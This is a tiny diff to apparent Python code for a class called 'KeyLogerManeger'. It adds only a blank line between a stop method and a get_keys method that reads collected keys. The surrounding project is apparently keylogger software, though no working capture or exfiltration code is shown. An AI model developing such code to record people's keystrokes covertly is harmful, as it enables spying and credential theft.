@@ -10,6 +10,7 @@ class KeyLogerManeger():
     def stop(self):
         self.x.stop()
 
+    
     def get_keys(self):
         self.keys = self.x.get_to_keys()
         pass
